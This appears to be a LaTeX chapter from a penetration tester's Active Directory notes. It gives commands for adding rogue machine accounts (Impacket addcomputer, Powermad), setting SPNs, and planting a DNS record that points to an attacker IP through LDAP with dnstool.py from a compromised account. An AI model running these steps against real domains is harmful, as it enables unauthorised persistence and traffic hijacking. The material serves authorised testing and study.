\chapter{Misc}

\section{Create a Computer Account}

\subsection{Impacket}
\begin{verbatim}
addcomputer.py -computer-name 'SomeName$' -computer-pass 'SomePassword' \
    -dc-host "$DC_HOST" -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
\end{verbatim}
\verb+addcomputer+ might not add a SPN to the account  this should be added with \verb+addspn+

\verb+ntlmrelayx+ can also be used.

\subsection{Windows}

\subsubsection{Powermad}

\href{https://github.com/Kevin-Robertson/Powermad}{powermad}:
\begin{verbatim}
$password = ConvertTo-SecureString 'SomePassword' -AsPlainText -Force

New-MachineAccount -MachineAccount 'PENTEST01' -Password $($password) -Verbose

Get-DomainComputer FAKECOMPUTER #Check if created if you have powerview
\end{verbatim}

Does it create a SPN ?

Powershell:
\begin{verbatim}
Get-ADComputer -Identity MyComputer -Properties ServicePrincipalNames 
    |Select-Object -ExpandProperty ServicePrincipalNames


Set-ADComputer @{Add='WSMAN/Mycomputer'}
Set-ADComputer -ServicePrincipalNames @{Add='WSMAN/Mycomputer','WSMAN/Mycomputer.MyDomain.Com'}
Set-ADComputer -ServicePrincipalNames @{Add='WSMAN/Mycomputer'},@{Remove='WSMAN/Mycomputer.MyDomain.Com'}
\end{verbatim}


Setspn.exe:

\begin{verbatim}
setspn -S pwn/TARGET_NAME.DOMAIN TARGET_NAME
\end{verbatim}




\section{Create a new DNS record}

\href{https://github.com/dirkjanm/krbrelayx}{dnstool.py} allow to
add/modify/delete Active Directory Integrated DNS records via LDAP.

\begin{verbatim}
$ python dnstool.py \
    -u foo.lan\\ownedUser -p userPassword \
    -r PWNED.foo.lan -a add -d <attacker-IP> \
    DC1.foo.lan
\end{verbatim}
